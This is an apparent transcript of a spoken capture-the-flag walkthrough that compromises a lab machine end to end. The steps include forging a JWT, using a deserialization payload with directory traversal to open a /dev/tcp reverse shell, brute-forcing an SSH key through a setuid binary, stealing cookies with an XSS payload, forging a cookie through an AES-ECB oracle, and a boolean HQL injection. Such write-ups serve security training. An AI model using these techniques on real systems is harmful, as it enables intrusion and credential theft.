ipsec.scr sounds great to me and then the next piece we have to do is just edit our jwt so we can copy this go here paste this in and we want to put a modified payload so let's copy and the key piece is you have the secret key there and that came from the lfi in python so here's the new base64 object and if we want we can take a look at it again i think i did but um yeah i did it's just got the payload which says um the username is gonna be that dot dot slash thing but before we run that we want to do tcp dump dash i ton 0 icmp so we can see the ping packet come in and i'm going to add the dash n to not do dns resolution so we send this we get error fetching profile and we don't get a ping so uh something went wrong which is not good i'm gonna run it again nope nothing let's see so we do dollar this ping 10 10 14 8 um data uploads ipsec.ser i think that's correct um we can add some more dot slashes just in case we're not there um because i would think we're gonna be in like a data directory let's just add more slashes this way so dot dot slash i'm not positive if java cares about it i know some programming languages when you traverse beyond the root bad things happen i hope this is not one of those cases so copy this let's go to the payload i pasted in the wrong spot put this copy go here put this we still have error fetching profile and we don't have a ping so things are not looking good on us let's see so we do this um we can put more dot dot slashes this side i don't think it's going to help i think we have to like pause the video and do some troubleshooting and say exactly what happened here but we can try this paste copy paste refresh error fetching profile and still no ping so something is seriously wrong so um i guess i'm going to pause the video and see if i can figure it out okay i haven't tested anything but i did find out two different things that could be the issue the first piece is interactional exploit code we are shoot let me scroll to the right adding the dot s-e-r here which we don't want to do because if we go into the user which is where the read function is we can see it's going to do dio get absolute path slash username and then append dot ser this username is really going to be like wonky right um username is equal to this so it's going to do the absolute path which i think was like data user or something like that and they're expecting to load ipsec dot ser there but again we are doing this attack which puts a bunch of dot dot slashes in and it's a directory traversal so um that should fix it so if we send this we can copy go to jwtio paste this in and send this new thing make sure tcp dump is running paste send and we don't get anything so the second piece that could be erroring um is when it's reading this serialized thing so i did make a mistake here i believe because if we look at profile is this where it reads it um see this this logs thing is null i think that's what the issue is um [Music] let's see new profile i don't know exactly where the read is get profile location i think when it's reading the profile in because this logs is null and not what it should be is this arraylist it's just erroring out it's got some like typing issue and just crashing because we're passing null when it should be an arraylist so if i define that to be array list um change value of logs to be list object instead of list string how did this start out let's see did we change this um let's go to java source the profile how is this stored right it's a list string and that's how it is if we just say get rid of that null does that fix it no let's wonder change type array list we do it like this and we have an issue here did i just fix it by clicking random things no i did not we still have an issue um let's see if i just drawn this it's going to crash on me right proceed yeah so we have something wrong here um so i don't know exactly how to fix this so change type of logs to be [Music] list object if we do that i don't think this is going to work but i guess there's no harm in trying right so let's upload the new ipsec.ser upload that and then i don't think our base64 changes at all so we can probably just go to rip sweet send it it took a second is that a hopeful no that worked um let me do this again awesome um just to like be a hundred and ten percent sure let's remove ipsec.ser and do everything this whole workflow right so run this we created ipsec.ser i'm going to upload it i'm going to go through prep suite because this application doesn't give me any like indication i uploaded it so upload and there we go we can see i have uploaded it and then the next piece is we're going to go to repeater copy this string where is jwt.io because we want to paste it in and i don't think that changed at all but the main thing i'm doing here is make sure all the changes i did i wasn't like on one old piece of the file um i guess maybe i'm jumping the gun because we have to do this anyways because we want to change it away from icmp we want to do a reverse shell right so um let's go back into eclipse and i can go to this app.java instead of ping let's do a reverse shell so um we can't use slashes slash is a bad character so i'm gonna do echo dash n um i'm trying to think do i do echo and i can do a base64 cradle or i can curl it and download code um let's just do this echo dash and let's do i dev tcp 10 10 14 8 9 000 1 00 and 1 base64 w0 and we can copy this so we paste base64-d pipe it over to bash okay so if we run this now we have a new base64 here we just paste it in our user profile doesn't change that ipsec.ser file again the only thing that does is tell the server that we're an admin right so uh we didn't change a piece to that code paste this and we don't get a response back which means we have a reverse shell so ah that piece of the video is done i am happy for that hopefully it made sense um it took me a while to wrap my head around it and oxdf helped me a lot so big thanks to him um hopefully that helped you but now we have a shell and because this video is long enough as is i'm not going to bore you with all the limpy stuff let's just go straight to looking for like set uid binaries because i know that's the next path and the tty's a bit weird let's so let's fix that real quick so i'm going to go to a new pane stty dash a and 26 105. so stty rose 26 call i think 105 yes it was um is it calls is there four characters for each it is so now when i go to the end of the screen um it properly does line wrapping so i could go back here and do what i wanted to even though this directory doesn't matter we could look at the config and try to find passwords but binary be the next logical step so if i do find dash dash perm minus 4000 this is going to look for a set uid i'm going to hide error messages so i send 2 to dev null and we have everything we could also do a ls and this will show us the permissions we can see everything has the set uid bit it's a bit noisy output so i'm just going to do this oddly enough there is this chrome sandbox um c match is the one i really don't recognize so if we do an ls-la on user bin c match we have this as the john user and also an odd thing this time stamp i guess it was placed by a package manager because the modify is all zeros i was going to think that the modification would not be all zero so um forget that tangent i'm guessing maybe this is an actual legitimate program and if we just run c match it says incorrect number of arguments or maybe it was like copied over an archive i don't know but if we give it one argument we get that if we get two um it says no such file a directory so i'm going to give it a file etsy passwd and let's just do the second argument and it says it found 51 matches so that's weird if i give this root it found three matches and if i grep root out of etsy past wd we see there's three times past etsy passwd says root the user i want to say the group i don't know exactly what field that is and then the home directory so the next piece i want to do does this support regular expressions we're going to say does this line begin with root and we have found one match so at this point we have this c match binary that we can use to like x fill files potentially one character at a time by doing this whole match thing and it runs as the john user so my first step is let's see if there's an id rsa file in john's directory so if i do home john dot ssh id rsa and i'm gonna search for begin because that's like begin private key we found one match so for this we can brute force um one character at a time this and we're getting two matches because the begin and the end is the same right so if i do b here now we have one match so it's probably begin private i think i forget exactly what it is is it a dash after it is not we'll just leave this as the known so we want to create a python script that can brute force this so i'm going to go v let's do it in www uh do i not have a www directory i thought i did but maybe not v brute dot pi and the very first thing we want to do is get a bunch of character sets so i'm going to do from string import ascii uppercase then ascii lowercase and digits and i'm doing going to do these individually because i want to make this go somewhat fast we also have to import sub process because we want to be able to execute commands and the other thing we need is the known i'm going to set this to be begin like this and this is how our program is going to start but we also need symbols and the ssh key is probably going to be base 64. so i'm just going to do character sets that are in base 64. underscore and hyphen is going to be url base64 uh plus an equals is normal base64 there could be commas in this there could be slashes it could be colons could be pluses could be a space and we also need line breaks right so and maybe a return because sometimes it's a slash n sometimes it's the backslash r um so we don't know exactly what return it is it's probably gonna be slash n but it doesn't slow us down to add just one more really so the very first thing we have to do is create a function that's going to check for matches so we're going to create it with check match and i'm just going to call it data and the result of subprocess dot check output and we're going to run cmatch home john ssh id rsa and then we want to match what is data i don't think i need to put this in quotes but i'm just doing it to be safe because um there could be a space and a space would separate arguments so that's why i'm doing it with that let me do shell is equal to true and then if um this says found matches so this is going to be false so if we grab this if found matches zero in result return false else return true and i know there's no else statement but i really don't need it because the only time it's going to hit here is if this doesn't match right so that should be fine next thing we want to do is create a loop so i'm going to do running is equal to true and while running is equal to true we're going to do a check matches and i'm going to break this up into four different matches first because this does support regular expressions so i'm going to check match and we're going to do it against known first and then the second thing is going to be uppercase characters and the reason why i'm doing this is because it's going to speed it up because it doesn't have to go through the whole dictionary every time right so if check match let's just copy and paste so instead of capital a to z we're gonna do lowercase a to z and we'll set it to be lowercase and then the next thing we want to do is digits so 0 to 9 and then we'll set the character set to be digits and then finally we want symbols and i'm just going to say else i'm going to set it to be symbols and we can make these now elifs or like else ifs so now we have a character set it's probably going to match somewhere here um let's see i wonder if i should just break this well um the correct thing to do would be something like this put our symbols in that bracket and then else set running to false because if it doesn't match any of those chances are we're done um i guess we can try this so let's do symbols and hope i don't break anything with this so let's move this up and then else we'll do running is equal to false and that should end our program i think we may have to break as well so now we can do a four character and care set and say if check match and this is going to be known plus the character then we want to print to screen so print c end is equal to nothing flush is equal to true and what this is going to do is create like a fancy like scrolling thing because we're not going to print and like um line breaks afterwards it's just going to print the string as it like brute forces it and after the match we do known is equal to known plus c and then break and the only issue we're going to run into now is special characters in regular expressions so i'm going to do if c n and the special characters probably be plus and slash um let me go up here i want to say that's the only ones we have and if that's the case then c is equal to escape plus c so i think this is it so i'm going to python3 python3.m http server and we can go over here and say curl 1010148 8000 root.pi and pipe it over to python and we aired um c match so we didn't escape special characters on this begin and that's why um so i'm just going to change this instead of matching for the symbols i'm just going to do the else like i had at first and leave that up to you there we go that should fix it run this and here we have it dumping data um i'm noticing two issues the first one is we didn't type the first part at the beginning and the second issue is or escaping regular expressions is making it into our key so we can fix that by going back over the script and in here if we do c then negative one this is always going to get the last character so if i go python3 um a is equal to we'll call it a and then if we print a negative one it's still prints a right if this is b a and we print it it's still one so um it's always going to ignore that escape that we put in so the next piece we just want to print the known first so we can print known and flush equals true there we go and now let's run this and we have it printing out the key and hopefully every line goes to the same spot which it looks like it's doing so um success i'm kind of curious how slow this would have went if we did not do the breaking it into four pieces so um i'm going to just pause this video we'll get to when it's done and we'll probably remove that piece of code and see how much slower it is it is now done so let's go and save this key real quick and then make a quick edit to see how much this actually sped things up so vi uh what do i want to call this john dot key paste it in and then let's go over to a python web server cp brute to brute 2 dot pi and let us change this so character set all we have to do is careset is equal to ascii uppercase plus ascii lowercase plus digits plus symbols okay and comment everything else and now a brute force script should be unoptimized right so we run this i mean it's still faster than i expected because i guess many of the characters are upper case but you can definitely see it going a bit slower right if we do brute 2 real quick that's the speed it goes when we do that optimization so you can see already it went faster i did no video editing there so um we have that ssh key so let us attempt to crack it so we do ssh to john i probably have to copy this over to the kraken so let's scp the key over to the kraken and then we can ssh into it and go into my john directory where the ssh to john exists and give it the key and then we can rename it to be john.key.hash and then we can just run john against this so we can do dash dash word list is equal to opt word list rock u dot text and then specify the file and it's not going to crack um we could try going to our signing key taking this and attempting to crack with the signing key because that's another like password that was on the server and because password reuse maybe it happens but it's not this password so let's go take a look back at the web server on there's a bunch of files here we can grab our i password on everything see if we have anything um do a search so we highlight password and everything i'm looking at it doesn't have an actual password it's just like property name password um i don't think the password is app so it's not that um generally when it comes to java things if it's a jar file it's gonna be like a thick client if it's a web server it's gonna be um compiled up into what's called a war file war so that's what i'm going to grab for here to see if we find anything and we do we have this internal app.war so this is just a zip archive that contains a bunch of java files so let's copy this over to our box so nclvnp uh 9001 and we'll send it to app.war and we can run nc 1010 14 8 9 000 1 and direct this file there so start this transfer send the file give it a few seconds i should have checked how big this file was because netcat doesn't tell us when it's done so the best way to do it is md5 sum after you control c it and make sure the sums match and it looks like they do it begins with one e ends with b0 so we have the app.war here and the next thing is just opening jd gui now when i first did this box i had issues so i had to app install open jdk 17-jdk because i had jdk i think 11 on my box which is old and um jad wasn't or jd gui wasn't compatible with it so run java dash dash version if you see open jdk 11 that's where you're going to have the issues so you want to install the newer jdk and then you can do jd gui and then open up app.war and jd gui is also inside of app so i think i just did sudo apt install jd gui so um yeah so now that we have this we can go into i guess webm classes and start examining this so we got this user dao and looking through it doesn't do a great job at decompiling it and we also get some java byte code here of things it couldn't decompile i wonder if we can do a find navigation search um let's see string i'm just going to search for everything that contains password um there's nulls and not good so user class um this one is just the column name so we don't really care about that uh there is a lib teradata jdbc drive manage connection and this just has the word password in it so that does not help us this idea does not to be panning out well so let's cancel this and let us just look at the various files so utils we have crypt util and is there a password in here we control f just can control f all these and see if password exists and hibernate it does so it didn't decompile it but we do have the java byte code and we see when it does password it loads it here so i think this is the password if we look above we have the hibernate connection username hdb and we see it's doing localhost 3306. so and the database is fingerprint so we can try logging into this database so if i oh did copy work there it did so if i go here we do mysql dash u hdb link dash p like that log in um let's see what is the database name fingerprint see dash h localhost lowercase h so i don't know oh i'm putting in password the wrong clipboard there we go and now we get in so use fingerprint and whenever i say wrong clipboard if i do shift insert it does one ctrl shift insert it does another so we can do show tables describe users and select star from users so we can get all the hashes this way we probably could have extracted the fingerprint from our hibernate command um i'll try that out probably at the end of the video if it's not too long but instead of like username you would just do uh fingerprint and the hql and you could probably filter out and check with this since it's in the database so you may not need that cross-site scripting step you would just have to guess the column name is fingerprint which isn't a stretch so we got admin and michael one two three four five but nothing really here um was that this password no so we have three passwords to add so let's go back here v custom let's add the hibernate password then let's add michael's password then let's add admins password okay and rerun this john crack and we get it so it is the q9 password which was the hibernate the the password to the database so now we can go to a bash and sh-i john.key john at 10 10 11. 127 i want to say is the ip unprotected key file chmod 600 john dot key it's going to ask us for the passphrase we put it in and we get logged in and that's where user.txt is so in the name of keeping this video somewhat short i'm not going to go over all my normal recon like running linps and things like that we could start off by finding all the files owned by our user that's always a good spot to start so i do find slash john and we direct errors to dev null we have a lot of files so the first thing i want to do here is um let's hide some things so i'm doing a grep v to exclude and i don't like var lib and if we go up there's proc after proc maybe we should just run this again because proc is so big so let's just hide proc as well and then probably run user and sys so slash run slash user slash sis and we're getting a lot shorter if i do i type f to only show me files because like this dot local i see as a directory this these directories are just um like clogging up the space we can see stuff obviously we're in a command we can see stuff but um i'm just looking through here we have gnu pg keys nothing really too interesting we got a lxc config so i type groups i'm not part of the lxc group here's this bin c match thing so that's that set uid binary that we had if we change this user to look for members of our group which is john we have this file verb backups flask app secure dot back and also if we looked at this directory i'm guessing this file would have stuck out if we did like the time stamp checks because we have the modify time like uh actually if our backups will always have the modify time i believe so ignore the time stamp piece again in this video just google like or go to ipsec.rocks and do um timestamps to find out what i'm talking about i can do that for you ipsec.rocks uh we have to turn burp suite off and timestamp yeah like analyzing timestamps this one and back end too um [Music] these will all be good so i digress we have that var backups let's go back in that directory and that flask app secure.back so i'm gonna do a file against it and we see it's just zip data so let's copy this over to our box so nc lvmp 9001 to let's just copy this name and append a dot zip and we can say nc 10 10 8 9001 and direct that flask app to us so we're going to give this a few seconds or it finishes the copy and then let's go examine exactly what this is remember the first app that we looked at was a flask app so let's unzip plus app secure thank god that put it in the directory net club in my working directory um we have a thing that looks similar to the last class gap app and auth if i look at improvements we see fixed access control flaw introduced authorization and safe authentication with custom crypto and whenever you hear custom crypto um it's probably going to be vulnerable so if we look at auth.pi this looks similar it's just going to grab stuff out of the database so the real thing is in this app.pi file i guess so we have a secret and a key that's going to be used for crypto um it's being put into ecb mode which is electronic code block and it's a very simple encryption mode every block is going to be encrypted the same exact way so if you wanted to decrypt block three you don't have to decrypt block one i believe and um i'm bad with crypto so i may be wrong there that's my understanding if it was in like cbc which i think is cipher block chaining mode then each block is dependent on the previous so if you want to try to decrypt block 2 but didn't decrypt block 1 you're out of luck right because every block depends on the next one so um knowing it's ecb that's where my mind is going the block size is going to be 16 data logs so this login so we have this e-user auth and it's going to put i guess probably the username and then the comma the secret and then true or false so i'm guessing this one is going to be admin right so the cookie looks like username secret true false and if we have a way to create our own cookies we're going to have some type of attack here we'll probably get more into it in just a minute but because our username is before the secret if the block size is let's do 8. because that's easy so if we put user name here right or username that's seven characters right and if the crypto encrypts this it's going to put comma secret here and since the block size is 8 so that would be the block right and this would be the next block um [Music] we would be able to register a username one byte at a time and when we register username comma this block is going to look the same because that's exactly how it was um we put user name or username and the program appends this comma and we analyze this block and then what we do is we type username or use an am comma and then it appends comma secret and that's going into the next block which is completely irrelevant to us brute forcing one character at a time so the next request we do we would just send it userna right and that would be the rest of the block and what it would do is append comma s and we would brute force one byte at a time because we know the very first one is going to be comma we brute force this until something matches up so that's going to be the attack so keep that in the back of your head i probably should have explained that um right when we get to it so i'm gonna go over this stuff pretty quick uh load user this is just going to load it and it's decrypting the cookie with a split which we will abuse um i'll explain that later um admin we have profile and this profile is going to give us our new name so if we access slash profile without a uid or without his admin it's going to direct us to a 302 otherwise it's going to generate a new name for us using that crypto so we can abuse this parameter by just generating a bunch of um i guess names so the first thing to do to access this though is we have to get a cookie to this application and we know there is a cross-site scripting vulnerability on fingerprint.hdb and we also um don't know the port this is listening on so we got two things we have to number one get the cookie number two get the port so let's go and find out what port this is running on so i think that is this pane there we go um we could do ss lntp see all the running things and there is a lot of ports that we don't know like 86 86 4848 a lot of things are coming up that i'm not sure we're listening on all hosts on 8088. um i guess this is just ipv4 and this is ipv4 and 6. um let's see we went into etsy find dot grep flask do we have anything um there's two systemd scripts we have flask.service and flaskbeta.service if i looked at flask.service this would just be port 80. if we look at flask beta this will be port 8088. so we know we have to forward port 8088 to our box in order to access this or we can do it all on this box itself but i'm going to do an ssh tunnel so we can actually see the application so i'm going to drop into ssh command line mode by making sure that squiggly c is the very first thing i type on a line and then we can add dash l8088 to open up 88.8 on our local box and we're going to direct it to localhost 8088 through this ssh session so now when i go down here i can curl localhost 8088 and we get the page so if i go to localhost 8088 we have my log so this is the same exact application we could try logging in with a bunch of credentials we have from previously but i didn't take notes and i know none of them will work so the other thing we could do is revisit our cross-site scripting so remember we wrote this pwn.xss where we directed them to our box and got fingerprint id we could do the same exact thing but instead of get fingerprint id we can put document.cookie i think it's dot cookie is it cookie or cookies um google document dot cookie so no s and then slash image so we uh yeah we don't even have to include that other script source so when i copy this i can literally just copy this piece and if we do nc lvmp80 with the sudo we're now listening on that port we can go to 1010 127 port 8080 and we want to hit that login and we paste this code and unable to require jdbc connection did we crash this app uh let's see that time it worked that's weird um i'm just going to exit that mysql session just to be safe so we hit this okay invalid credentials given let's see that's nc here's my netcat okay so let's go and test this real quick if i do i have an invert repeater we do not so see this location is 80.88 we want it to be on port 80. and i want to go to i think it's slash admin view auth.log is this the request 10 10 11 127. okay so we can see what it's writing um we have our crosstalk scripting payload in there and that looks good oh we have a hit so they sent us user id is equal to and then this so we got a bunch of hacks awesome so the next thing we want to do is i guess test out our cookie so if i curl 10 10 11 127 slash profile and dash d for data and we're going to put new name is equal to ipsec and then dash capital h cookie colon this what happens um we actually want to curl localhost 8088. dash v awesome i'm going to add a dash s in as well and we want this cookie line so i'm going to grep for set cookie let's see if i send two to one that did not do what i thought it would do um two and one do i do it that way did that just crash completely let's see so it does not like that okay we do the end on that side we grab cookie so let's grab set cookie there we go we want to um grab op [Music] user id is equal to dot slash i believe let's see like this that's not working let's switch over to like awk so we can do awk and then print substring and then this will be i think match one and match two so if i do dollar two comma one eight to print the first eight characters to make sure we have the right substring that is set cookie so i guess we start a match at three which would be user id and then let's go 8 to 10 that's an equals so we can do um so what i just did there is i was seeing if this is matching characters one through eight or just eight characters after one um i didn't know which one it was so that's why i changed the second parameter we got ten and since this didn't just give us two characters which would be like eight to ten um it gave us ten characters after match eight so we can do nine and then i can do 32 and that's going to be the first block size because this looks like hexadecimal output and we know the block size is 16 so if it's 16 characters that'll be 32 and hex so that's why i did that we could do a wc-c we get 33 which is the 32 and a line break i'm gonna put a echo before my curl like this so we just see the hash on a clear line so now we know the block size and what we have to do is change our new name so right now ipsec is six characters we want to get this to 16. actually um block size i'm trying to think i think we put seven characters and we only care about 16 like this um trying to think no i think it's like this my brain is like mush right now so um let's just learn by doing right so i'm gonna do a python three command and we're going to print uh 15 a's right so let's print a times 15. uh we have to put that in parentheses i can't believe i made that mistake so we have 15 a's here so if i run this we put 15 in this new name we have four six five e4 starting with a very first crypto block if we put a 16th a we get something completely different however we know it's going to append comma and then the secret for us right so we know the very first guess is going to be a comma so if we do 15 a's and a comma we get 4 6 5 e4 so um yeah my explanation earlier when i was doing eight characters confused me but this one is a 16 byte block so hopefully this makes sense like this is 15 a's and we know when the server does something it's going to go and append comma the secret value comma true or false so it fills up the very first block and that's good if we took off this arc maybe this can help so we have 15 a's and that's the whole cookie right and if we add that comma here we can see it matches up for the very first block the first 32 characters eb8555 f0a b let's see it ends right oh no it ends at six nine oh no uh f6 so we see this block matches up with this block but after that it gets completely different because um in the one where we guessed we put that comma there so now the server appends comma secret and it puts that in this whole new block um whereas the very first one it went here or the first block started with sec instead of comma scc so let's start creating a python script and if it doesn't make sense maybe this will help i don't know if it could or not but um yeah so let's create i'll call it block.pi i guess i'm bad with names so we're gonna import request and then i think i spelled that right from string import printable and this is gonna be an oxdf trick i learned so if we printed printable um let's see python three block the last five characters here are going to be bad i believe right or maybe we just don't use them at all let's see block we do negative five yeah the last five characters of printable are bad so if we xxd this we see it ends in that period if i take off this remove last five we get a bunch of um like line break things o a o d o b o c so man ascii if you wanted to look at these oa would be new line vertical tab form feed carrot feed apparently those are in the printable dictionary so what he does is just as printable minus five to get rid of those um it's a nice way to get a good character list so we need two functions the first function we're gonna have is just going to get a cookie and we'll put a guess here right and let me go back to my curl because we need all these parameters so uh we mainly just need this string at user id and grab it because we need a legitimate cookie so when i call this user id [Music] colon the hex and i had that copied so we can remove this there we go and then the next thing we need is data this is going to be the post request so we called it new underscore name and the value of that is going to be guess and now we can do a request.post to http localhost 8088 profile and then we need to give it our cookies then data is equal to data and we also want to tell it to not allow redirects because i think it did redirect us if we do this curl here we go get rid of all the grips yeah we can see it's redirecting us to slash admin we don't want to follow that we just want to grab this cookie so let's go here and we can say return r dot cookies dot get user id and if i didn't know this whole thing like i didn't know this was the parameter i would just return r which would be the request and i would then call getcookie and do abc and then i just execute python3 block and i put a dash i that drops us into pdb after we run it um request i don't know where that se came from i guess i was talking while typing but now we dropped in pdb so we can look we have to do r is equal to and we can look at it so we can do r dot cookies and then dot get user id and figure out that's what we want to do so our dot cookies get user id okay so we have a function to get cookies now we want a function to test a block so we can do def test block and we can give it a block number so we'll give it block valid and guess and what this is going to do is attempt a request on slash profile i don't know how to explain it um it's so simple i'm not going to comment my code because that'll just take longer i guess and maybe not help it's hard to talk and tight so what test block is going to do is just we're going to give it what we know the block is correct so that will be when we gave it previously we just gave it 15 a's and then it responds with the comma that's going to be what valid is val is going to be um what we're guessing against and then guess is going to be a single character the input we're putting in so hopefully this will make sense so starting off we have to do block times 32 because if block is going to be zero which will be the first block this will be zero if it's one it's going to be 32 if it's two it's going to be 64. so this is telling us where in the cookie to look for right and then we could do end is equal to start plus 32 so we can do cookie is equal to get cookie and guess and then we can trim cookie and we can just do it here um we can do start colon end like that and here we can say if cookie is equal to valid start end return true else return false so valid again is going to be the hash we're attempting to guess and this is going to be our attempt so this would be um 15 a's and an a and then that hash won't match valid if we did 15 a's and a comma then that would match valid in this example so we can do known is equal to and i'm going to leave it nothing we could set this to oh we can do a comma first and see if we get it generally i would set it to nothing because i know this is going to be valid and it would be a good test if we determine it worked on like if we went through the whole character set and nothing happened we know there's an error because it should have flagged on comma but in the ascii printable or the string printable comma is one of the very last characters so it's going to take a long time using the power of hindsight i know the first character we're going to want is going to be a 7 because i have solved this challenge before so um it'll be much quicker to test this way so while true uh we have to determine the block we are on so we can do block is equal to um trying to think of a good way to get to zero we can get an integer because this is going to produce a decimal we can do length of known plus 1 divided by 16. and the reason why i'm adding this 1 here is because i want to trick the program to saying if our known is 15 characters just go to the next block because there was a check here for if you new name is blank return error and if her noon is 15 characters then her name would have to be blank to be able to brute force it and we can't so that's why i'm adding this one here um the integer is because if we did python let's see if we just dropped into python 3 and did 1 divided by 16 it gives us a decimal so integer would make that zero right and then 16 is one if we did 18 um it's not rounding up so if i did 15 over 16 it's still zero so that's why i do this integer check there and then we need to get the total size so total size is going to be block times 16 plus 16. and um the total size is going to be how much data we're padding with so this is going to be the number of a's right or like i'm trying to think if we had four characters yeah so probably make sense in a minute it's hard to formulate things into words but um if we're on the second block we want the total size of our payload to be 32 right so second block would be block one in this case because we started at zero so one times 16 plus 16 that's 32. um if we're on block three we'd want it to be um 48 so 2 times 16 would be 32 plus 16 would be 48. so now we want to go through every character so 4c and printable minus the last five characters and we can say guess is equal to known plus c so we're taking what's up here adding the random character to it and we can say print and if we do a carriage return first this is going to force us to i think flush is the word and we can say guess and end with nothing so this is going to give us a pretty like spinny wheel so if we did python3 block.pi uh we forgot the n or c and printable see it's doing this little spinny thing so we know it's working it's going to do that and we have to get the padding so this is gonna be the number of a's we put in it can be any character but we're gonna say the total size this is gonna be the total size of the request we want to make minus the length of our guess and then we can give let's see and now i'm realizing a flaw in what i was going to do so i'm just going to do this and we're going to change in a minute so the next thing is we need to get valid right so we can do valid is equal to get cookie padding and the reason why i don't like this right now is i'm running the valid check every single time so for every character we're making two http requests which is double then what we need so we can get like uh probably a super performance increase if we move this valid check above this loop but we'll do that after we finish this so we can say if test block block valid and then we can say padding plus guess and if that test block is correct we can say known is equal to known plus c [Music] and break so the padding would be if we didn't have known as question mark the padding would be 15 a's and guess would be a comma and um yeah hopefully it's been making sense we're gonna see if this works so we get five six seven and it's moving across so um it does but this is going slow so i'm gonna see if i can speed this up a bit because we want to move valid up here and we don't have padding defined um total size that's always gonna be one right oh no guess is known plus c yeah so um for this we can just say um what if we could define padding above here and instead of length of guess we do length of known plus one because we know the guess like that's always going to be added one character here so let's run this padding is not defined what did i call it padding oh there we go that did not work that did not work in the slightest so let's see minus length of known plus one i thought that would be it we just do length of known don't know why it's always saying zero is valid here so known plus one so what was it before um we have some weird mistake oh um i think it's an order of operations thing so if we put come on cursors type there we go so we want to minus this one so we're subtracting the length of known which would be one and then we're adding one so we're doing minus one plus one which is stupid um it should be -2 and this should fix it up so if we run this there we go and you can see that is going much faster than it was previously so um i'm going to i guess pause the video and just let this run because it takes a while to run um let's just do time and we also actually don't have it um ever stopping we never killed a while loop so it's just going to like spin indefinitely and when it does that um we know we have brute forced it so um yeah and we can see the script is almost finished um we have the secret here and then the application did comma false because we're not an admin and i'm guessing this wheel is just going to spin indefinitely because we never coded that stop so i'm just going to kill this once it gets back into i guess the lower case it's doing the symbols now of it and here we go it just did a complete loop so we can kill it it took about six minutes to run so with this uh where is it oh that kill was not a good thing there we go um we can brute force or not brute force we can create our own cookie that gives us admin privilege so let's take a look back at the code uh we have it let's see it's going to do a new window and if we want in flask backup app.pi let's see where is the function for checking uid okay so it's going to split upon comma secret and that's how it's going to get the uid what is the admin check oh is admin so it's going to split on the second value so if we just create a username like admin comma secret comma true then it's going to append comma secret comma false right so this split will hopefully um have the very first value as admin and then the second value as true i guess we can test this out let's see can we easily test this out let's do python3 and we can say s is equal to admin comma secret comma true comma secret comma false because this is what the string is going to be and if we do a um s dot split comma plus a comma secret comma but this we have admin true and false and zero is going to be admin one is going to be true right so that's what we're going to attempt here so we can i was trying to unhighlight that if i just copy this we can go back to our curl and the new name is going to be admin comma that comma true and it's going to append that comma for us so this cookie will hopefully be one that has admin privilege so we can access the lfi again on this old app or the new app so let's do localhost 8088 and then i'm going to uh we can delete all cookies and i can add a new cookie we'll call it user underscore id put the value of this and if we do slash admin how about slash profile method allowed slash admin did not oh we have user id equals and a cookie there we go let's try this slash admin and we get in and if we view it we can um we can send this over to burp suite and this application is running as root so we should be able to include any file so if we did get admin and then like proc self um cmd line see if this works we have it it's running flask on port 8088 if we did environment we can get the environment um so i remember which one i normally do to get username flask that's the name of the application um we could try including like etsy shadow and we can we can try root.ssh id rsa we got a key and we can just copy and paste this key in so we can copy this and v root dot key paste it chmod 600 root.key ssh-i root at 10 10 11 127. and we have successfully rooted the box so um yeah hope you guys enjoyed this uh video i think there was one piece i wanted to do um a video on that is the hibernate if we could brute force the um fingerprint because we know the fingerprint here so we may be able to do like sub string and do a blind brute force to get this fingerprint uh we could also probably do password as well so i guess we can do that real quick and then call it a video so we're back here at this login form this is where the hibernate vulnerability was so we do admin password intercept and send it to her burp suite here's the login and remember if we did a question mark we had this hibernate error um we do or substring i think it was username one one is equal to m and this was single quote m like this and this passes us right internal server error uh sub str is it or substring yeah so now we have invalid fingerprint id so if we did this any other character other than a we get invalid credentials so if we tried fingerprint and we know the very first one is nine substring fingerprint i put the nine on the wrong end of that quote we have invalid fingerprint id again if we make this a two we have invalid credentials if we look at this we know it's 9 9 so we can try 9 9 here invalid fingerprint so we can add a 3 and this should be a c so go c invalid fingerprint if we did anything else it would be invalid credentials so this is a way we could brute force and get the fingerprint without doing any cross-site scripting we could also do it on password so we could say password one one is equal to zero maybe that's a capital o invalid fingerprint then nine uh oh we have to make this two characters long we get a nine and we can brute force one character at a time through this um boolean injection right so hope you guys enjoyed the video take care and i will see you all next time